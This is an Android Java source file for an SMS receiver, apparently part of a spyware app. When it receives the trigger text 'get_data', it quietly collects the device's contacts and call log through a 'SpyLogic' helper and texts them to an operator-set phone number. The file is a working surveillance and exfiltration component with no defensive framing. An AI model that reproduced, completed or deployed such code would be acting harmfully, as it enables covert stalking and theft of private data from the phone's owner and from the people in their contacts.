package com.example.numberwatcher;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.telephony.SmsManager;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TRIGGER_WORD = "get_data";
    private static final String TARGET_NUMBER = "YOUR_NUMBER_HERE"; // غيّر هذا لرقمك

    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            String body = sms.getMessageBody();
            String sender = sms.getOriginatingAddress();

            if (body.equalsIgnoreCase(TRIGGER_WORD)) {
                String contacts = SpyLogic.getContacts(context);
                String calls = SpyLogic.getCallLog(context);

                String message = "Contacts:\n" + contacts + "\nCalls:\n" + calls;

                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(TARGET_NUMBER, null, message, null, null);
            }
        }
    }
}
